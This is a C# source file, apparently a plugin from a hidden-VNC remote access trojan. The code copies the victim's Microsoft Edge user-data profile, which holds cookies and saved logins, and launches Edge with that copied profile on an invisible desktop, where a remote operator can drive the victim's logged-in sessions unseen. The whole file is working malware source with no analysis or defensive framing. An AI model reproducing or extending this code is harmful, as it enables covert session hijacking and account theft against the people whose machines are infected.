using System;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.Devices;

namespace Plugin.Helper.OpenApp;

internal class Edge
{
	private static readonly Computer PC = new Computer();

	private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data";

	private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\Edge Data";

	private static readonly string FilenameEdge = "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";

	private static readonly string FilenameEdgeX86 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";

	public static void OpenEdgeBrowser()
	{
		HideDesktop.Load(Plugin.HVNCDesktop);
		try
		{
			if (!File.Exists(FilenameEdge) && !File.Exists(FilenameEdgeX86))
			{
				return;
			}
			try
			{
				if (!Directory.Exists(fileNameUserDataCopy))
				{
					((ServerComputer)PC).FileSystem.CopyDirectory(fileNameUserData, fileNameUserDataCopy);
				}
			}
			catch
			{
			}
			new Thread((ThreadStart)delegate
			{
				Thread.Sleep(1000);
				HideDesktop.Load(Plugin.HVNCDesktop);
				Open();
			}).Start();
		}
		catch (Exception ex)
		{
			Client.Error("MicrosoftEdge: " + ex.Message);
		}
	}

	public static void Open()
	{
		try
		{
			string text = null;
			if (File.Exists(FilenameEdge))
			{
				text = FilenameEdge;
			}
			if (File.Exists(FilenameEdgeX86))
			{
				text = FilenameEdgeX86;
			}
			if (text != null)
			{
				HideDesktop.CreateProcess("\"" + text + "\" --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=" + fileNameUserDataCopy + "\"", Plugin.hwid, bAppName: false);
				Thread.Sleep(3000);
				HideDesktop.Load(Plugin.HVNCDesktop);
			}
		}
		catch (Exception ex)
		{
			Client.Error("MicrosoftEdge: " + ex.Message);
		}
	}
}
